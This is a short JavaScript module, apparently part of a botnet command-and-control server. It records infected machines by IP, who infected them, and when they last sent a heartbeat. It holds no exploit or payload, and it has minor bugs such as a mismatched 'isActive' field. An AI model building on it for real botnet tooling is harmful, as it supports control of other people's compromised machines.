const moment = require('moment')
const debug = require('debug')('server:bots-controller')
const chalk = require('chalk')

// BOT model
let bot = {
  ip: '',
  infectedByIp: '',
  infectedTime: '',
  infectedTimeDisplay: '',
  lastHeartbeat: '',
  lastHeartbeatDisplay: '',
  active: true
}

let bots = []

function getBots() {
  var now = moment()
  var check = moment().subtract(1, "minutes")
  bots.forEach(bot => {
    if (moment(bot.lastHeartbeat).isBefore(check)){
      bot.active = false
    }
  })
  return bots
}

function add(bot) {
  let exists = bots.find(b => b.ip === bot.ip)
  if (exists) {
    debug(`${chalk.redBright('Bot already exists')}`)
    return false
  } else {
    bot.infectedTime = moment()
    bot.infectedTimeDisplay = moment().format('L, LTS')
    bot.lastHeartbeat = moment()
    bot.lastHeartbeatDisplay = moment().format('L, LTS')
    bot.active = true
    // debug(bot)
    bots.push(bot)
    debug(`New Bot': ${chalk.green(bot.ip)}`)
    debug(`Count: ${bots.length}`)
    // debug(bots)
    return true
  }
}

// updates bot.lastHeartbeat (DATE / TIME)
function heartbeat(ip) {
  let i = bots.findIndex(b => b.ip === ip)
  if (i !== -1) {
    bots[i].lastHeartbeat = moment()
    bots[i].lastHeartbeatDisplay = moment().format('L, LTS')
    bots[i].isActive = true
    return true
  } else {
    return false
  }
}

function remove(ip) {
  return bots.filter(b => b.ip !== ip)
}

module.exports ={ getBots, add, heartbeat, remove}